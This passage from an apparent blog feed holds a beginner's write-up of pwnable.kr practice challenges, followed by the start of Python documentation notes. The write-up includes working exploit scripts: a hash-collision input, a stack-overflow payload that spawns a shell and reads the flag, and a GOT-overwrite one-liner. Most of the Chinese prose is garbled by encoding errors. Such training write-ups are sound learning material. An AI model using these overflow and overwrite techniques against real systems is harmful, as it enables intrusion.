p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœç„¶æˆ‘è¿˜æ˜¯å°ç™½ï¼Œè¿æœ€åŸºæœ¬çš„å¸¸è¯†éƒ½ä¸æ‡‚äº†ï¼Œæ„è¯†åˆ°äº†æ˜¯ç”±è¾“å…¥çš„<code>argv[1]</code>æ¥è®¡ç®—çš„ï¼Œ20ä¸ªå­—èŠ‚æ­£å¥½åˆ†æˆ5æ¬¡ï¼Œå°±æ˜¯æŠŠæ¯å››ä¸ªåŠ èµ·æ¥å°±è¡Œäº†ã€‚</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥æ‹¿<code>0x21DD09EC</code>å»é™¤æ‰5å°±å¥½äº†expå¦‚ä¸‹ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">print(pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'collision'</span>,<span class="string">'\xc9\xce\xc5\x06'</span>*<span class="number">4</span>+<span class="string">'\xc8\xce\xc5\x06'</span>],executable=<span class="string">'./col'</span>)</span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œè¿˜å­¦åˆ°äº†ä¸€æ³¢ç”¨<code>pwn</code>sshè¿æ¥çš„ã€‚</p><h2>bof</h2><p>æºç ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºçš„é¢˜ç›®è™½ç„¶ç®€å•ï¼Œä½†æ˜¯å°ç™½è¿˜æ˜¯è¦ä»”ç»†åœ°åˆ†æä¸€ä¸‹çš„ã€‚</p><p>funcå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œå…¶å®æ„Ÿè§‰æ±‡ç¼–ä»£ç çœ‹çš„æ›´æ˜ç™½ä¸€äº›ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:565D262C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C s               = byte ptr -2Ch</span><br><span class="line">.text:565D262C var_C           = dword ptr -0Ch</span><br><span class="line">.text:565D262C arg_0           = dword ptr  8</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C                 push    ebp</span><br><span class="line">.text:565D262D                 mov     ebp, esp</span><br><span class="line">.text:565D262F                 sub     esp, 48h</span><br><span class="line">.text:565D2632                 mov     eax, large gs:14h ;gsä¿æŠ¤æœºåˆ¶</span><br><span class="line">.text:565D2638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:565D263B                 xor     eax, eax</span><br><span class="line">.text:565D263D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:565D2644                 call    near ptr puts+565D2649h</span><br><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br><span class="line">.text:565D264F                 call    near ptr gets+565D2654h</span><br><span class="line">.text:565D2654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:565D265B                 jnz     short loc_565D266B</span><br><span class="line">.text:565D265D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:565D2664                 call    near ptr system+565D2669h</span><br><span class="line">.text:565D2669                 jmp     short loc_565D2677</span><br></pre></td></tr></table></figure></p><p>ä¹‹å‰ä¸€ç›´ä¸å¤ªæ˜ç™½å¦‚æœå±€éƒ¨å˜é‡æ˜¯æ•°ç»„è¯¥æ€ä¹ˆæ</p><p>å…³é”®æ˜¯è¿™é‡Œï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„<code>lea eax, [ebp+s]</code>è¿™é‡ŒåŠ äº†æ–¹æ‹¬å·ä½†æ˜¯å…¶å®è¿˜æ˜¯åœ°å€ï¼Œå°±æ˜¯å°†å­—ç¬¦ä¸²sçš„åœ°å€èµ‹å€¼ç»™eaxç„¶åå†å°†å…¶å­˜æ”¾åˆ°æ ˆé¡¶ï¼Œä¹‹åè°ƒç”¨<code>gets</code>å‡½æ•°ï¼Œå°†è¾“å…¥çš„å€¼å¡«å…¥åˆ°ç¼“å†²åŒº</p><p>ä»è¿™å¼ å›¾å°±èƒ½æ˜ç™½å†…å­˜çš„åˆ†å¸ƒäº†<img src="/assets/stack2_l89iia1d5.png" alt="stack2">è¿™é“é¢˜ç›®ä¿æŠ¤æœºåˆ¶åŸºæœ¬éƒ½å¼€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦æ‰§è¡Œä»£ç ã€‚åªéœ€è¦è¦†ç›–æ ˆä¸Šçš„å€¼å°±è¡Œäº†ã€‚ä¹Ÿä¸ä¼šè§¦å‘gsä¿æŠ¤æœºåˆ¶</p><p>expå¦‚ä¸‹ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line">r=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">print(r.connected())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pxy@ubuntu:~/pwnable$ python bofexp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">True</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p><h2>flag</h2><p>è¿™é“é¢˜ç›®è¢«upxåŠ å£³ï¼ŒLinuxä¸‹çš„åŠ å£³å€’è¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ã€‚</p><p>åˆ°<a href="https://github.com/upx/upx/releases/tag/v3.95" target="_blank" rel="noopener">è¿™é‡Œ</a>å¯ä»¥æ‰¾åˆ°è„±å£³çš„å·¥å…·</p><p>è„±å£³ä¹‹ågdbè½½å…¥ï¼ŒæŸ¥çœ‹åæ±‡ç¼–ä»£ç </p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;</span><br><span class="line">   0x000000000040118b &lt;+39&gt;:mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:leave  </span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; b *0x0000000000401184</span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨æ­¤å¤„ä¸‹æ–­ç‚¹</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x6c96b0 â—‚â€” 0x0</span><br><span class="line">RBX  0x401ae0 (__libc_csu_fini) â—‚â€” push   rbx</span><br><span class="line">RCX  0x8</span><br><span class="line">RDX  0x496628 â—‚â€” push   rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */</span><br><span class="line">RDI  0x4</span><br><span class="line">RSI  0x0</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x3</span><br><span class="line">R10  0x22</span><br></pre></td></tr></table></figure></p><p>å‘½ä¸­æ–­ç‚¹ä¹‹åå•æ­¥ä¸€æ¬¡å°±è¡Œè¿™æ—¶å€™å°±çœ‹åˆ°å¯„å­˜å™¨çš„å˜åŒ–</p><p>flagå°±æ˜¯é‚£ä¸ªæ‹‰2333</p><h2>paascode</h2><p>å­¦åˆ°äº†ä¸€ç‚¹ä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½ä¸œè¥¿çš„å‘½ä»¤</p><p><code>$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode .</code></p><p>æºç ï¼š</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ cat passcode.c             </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä½œä¸ºä¸€åå°ç™½è¿˜æ˜¯è¦å¥½å¥½åœ°åˆ†ææ ˆå¸§çš„æ„é€ </p><p>é‚£è¦æ€ä¹ˆåˆ†æç¨‹åºå‘¢ï¼Ÿæœ€å…³é”®çš„è¿˜æ˜¯åˆ†æç¨‹åºçš„äº¤äº’è¿‡ç¨‹ï¼Œæ¯•ç«Ÿæˆ‘ä»¬ä¹Ÿæ˜¯ä»ç¨‹åºçš„è¾“å…¥å…¥æ‰‹çš„ã€‚</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x804862a &lt;welcome+33&gt;    mov    eax, 0x80487dd</span><br><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">â–º 0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">  0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br></pre></td></tr></table></figure></p><p>æ­¤å¤„æ˜¯è°ƒç”¨<code>scanf</code>å‡½æ•°çš„è¿‡ç¨‹ï¼Œ å…ˆå°†ä¸€ä¸ªåœ°å€<code>0x80487dd</code>èµ‹å€¼ç»™eaxå¯„å­˜å™¨ï¼Œä¹‹åå°†ebp-0x70çš„åœ°å€ä¼ ç»™edxå¯„å­˜å™¨ï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„æ“ä½œç¬¦æ˜¯<code>lea</code>ä¹‹åå†å°†edxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆçš„ç¬¬äºŒå±‚ï¼Œæœ€åå°†eaxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆé¡¶ã€‚ æ‰€ä»¥è°ƒç”¨scanfå‡½æ•°çš„æ—¶å€™ï¼Œæ ˆé¡¶æ˜¯<code>0x80487dd</code>ï¼Œå¾€ä¸‹åŠ 4ä¸ªå­—èŠ‚å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡å¼€å§‹çš„ä½ç½®(å°±æ˜¯å­—ç¬¦ä¸²sçš„é¦–åœ°å€)</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">  0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">â–º 0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br><span class="line">       format: 0x80487dd â—‚â€” &apos;%100s&apos;</span><br><span class="line">       vararg: 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p><p>è¿™æ˜¯å‚æ•°çš„ä¼ é€’è¿‡ç¨‹æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ esp  0xff8e7050 â€”â–¸ 0x80487dd â—‚â€” and    eax, 0x73303031 /* &apos;%100s&apos; */</span><br><span class="line">01:0004â”‚      0xff8e7054 â€”â–¸ 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæœ‰ä¸€ç‚¹ç–‘æƒ‘</p><p>ç›´æ¥æŸ¥çœ‹å†…å­˜</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20x 0x80487dd</span><br><span class="line">0x80487dd:0x30303125</span><br></pre></td></tr></table></figure></p><p>0x30303125 å…¶å®å°±æ˜¯%100çš„å°ç«¯è¡¨ç¤ºï¼ï¼</p><p>ä½†æ˜¯æ¢ä¸€ç§æ–¹å¼çœ‹</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20i 0x80487dd</span><br><span class="line">   0x80487dd:and    eax,0x73303031</span><br><span class="line">   0x80487e2:add    BYTE PTR [edi+0x65],dl</span><br></pre></td></tr></table></figure></p><p>åˆ°åº•æ˜¯æ•°æ®è¿˜æ˜¯æŒ‡ä»¤å…¨çœ‹ç¨‹åºå‘˜äº†</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcode</span><br><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure></p><p>ä¸è¿‡è¿™é“é¢˜ç›®æˆ‘æ²¡æœ‰æå¾—å¾ˆæ¸…æ¥š</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;pwnableä»å°ç™½å¼€å§‹&lt;/h1&gt;
&lt;p&gt;pwnableæ˜¯ä¸€ä¸ªé€‚åˆå°ç™½çš„ç½‘ç«™&lt;/p&gt;
&lt;p&gt;https://pwnable.kr/play.php&lt;/p&gt;
&lt;h2&gt;fd&lt;/h2&gt;
&lt;p&gt;æœ‰æºç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;ta
      
    
    </summary>
    
      <category term="pwn" scheme="https://prontosil.club/categories/pwn/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pythonæ–‡æ¡£é˜…è¯»ç¬”è®°1</title>
    <link href="https://prontosil.club/2019/07/24/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/"/>
    <id>https://prontosil.club/2019/07/24/pythonæ–‡æ¡£é˜…è¯»ç¬”è®°1/</id>
    <published>2019-07-24T12:45:43.000Z</published>
    <updated>2019-07-24T12:48:41.773Z</updated>
    
    <content type="html"><![CDATA[<h1>python å®˜æ–¹æ–‡æ¡£é˜…è¯»</h1><p>pythonå¯è§†åŒ–ç¼–ç¨‹<a href="http://www.pythontutor.com/visualize.html#mode=edit" target="_blank" rel="noopener">ç½‘ç«™</a></p><h2>å¾ªç¯</h2><h3>å¾ªç¯çš„é—®é¢˜</h3><p>listç±»å‹æ˜¯å¯å˜åºåˆ—</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">'cat'</span>, <span class="string">'window'</span>, <span class="string">'defenestrate'</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words[:]:</span><br><span class="line">    <span class="keyword">if</span> len(w) &gt; <span class="number">6</span>:</span><br><span class="line">        words.insert(<span class="number">0</span>, w)</span><br><span class="line">print(words)</span><br></pre></td></tr></table></figure></p><p>å¦‚æœå°†ä¸Šè¿°ä»£ç çš„å¾ªç¯è¯­å¥æ”¹ä¸ºï¼š<code>for w in words:</code>é‚£ä¹ˆè¿™ä¸ªå¾ªç¯å°±å˜æˆäº†æ­»å¾ªç¯åŸå› æ˜¯wordsè¿™ä¸ª<code>list</code>ä¼šè¢«ä¿®æ”¹</p><p>åŒæ ·çš„å¯ä»¥çœ‹è¿™ä¸ªï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">basket = [<span class="string">'apple'</span>, <span class="string">'orange'</span>, <span class="string">'pear'</span>, <span class="string">'orange'</span>, <span class="string">'banana'</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> sorted(basket):</span><br><span class="line">    print(f)</span><br><span class="line"></span><br><span class="line">print(basket)</span><br></pre></td></tr></table></figure></p><p>åœ¨ç»è¿‡<code>sorted</code>å‡½æ•°ä¹‹åï¼Œbasketå·²ç»è¢«ä¿®æ”¹äº†</p><p>å¯ä»¥çœ‹è¿™ä¸ªï¼š</p><p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p><p>åŒæ ·çš„listè¿˜æœ‰è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š</p><p>ä»£ç å¦‚ä¸‹ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 